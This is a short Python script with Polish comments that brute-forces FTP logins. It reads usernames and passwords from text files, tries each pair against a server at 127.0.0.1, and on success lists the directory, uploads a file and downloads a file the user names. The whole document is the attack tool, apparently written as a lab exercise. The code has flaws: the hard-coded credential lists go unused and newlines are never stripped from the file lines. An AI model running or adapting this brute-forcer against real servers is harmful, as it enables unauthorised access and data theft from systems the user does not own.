import ftplib
# Przygotuj dwa pliki pass.txt i usernames.txt
# zrob bruteforce na maszyne z FTP
# zaladuj i pobierz plik z takiej maszyny

users = ['admin','kali']
passwords = ['12345','kali']

authenticated = False

valid_user = ""
valid_password = ""

server = ftplib.FTP()
for user in open("users.txt","r").readlines():
    for password in open("passwords.txt","r").readlines():
        try:
            server.connect("127.0.0.1",21, timeout=3)
            server.login(user,password)
            authenticated = True
            print("connected :)")

            valid_password = password
            valid_user = user
            print(valid_user, valid_password)
            print("store bianary")
            server.dir()

            server.storbinary("STOR ftp.py",open("ftp.py", "rb"))

            plik_do_pobrania = input("Podaj nazwe pliku z rozszerzeniem:")

            server.retrbinary("RETR " + plik_do_pobrania, open(plik_do_pobrania, "wb").write)

            break
        except Exception as e:
            pass
        finally:
            server.close()



